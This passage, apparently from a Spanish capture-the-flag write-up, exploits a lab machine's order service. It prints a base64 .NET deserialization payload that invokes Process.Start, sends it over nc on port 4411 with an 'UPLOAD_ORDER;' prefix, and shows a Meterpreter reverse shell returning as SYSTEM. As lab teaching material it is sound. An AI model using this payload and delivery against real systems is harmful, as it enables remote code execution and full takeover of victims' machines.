c2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw==
```
### Shell

Use el propio `nc` para conectarme al servicio que como se ve se abre en el puerto `4411` de la maquina y luego con la siguiente sintaxis envié mi payload --> `UPLOAD_ORDER;<base64>`

```bash
nc scrm.local 4411
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0d<SNIP>
```

Recibiendo así desde mi meterpreter la sesión como `system`.

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.17.19:4444 
[*] Sending stage (230982 bytes) to 10.129.233.204
[*] Meterpreter session 3 opened (10.10.17.19:4444 -> 10.129.233.204:53041) at 2026-01-09 17:59:27 -0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`~Happy Hacking.`

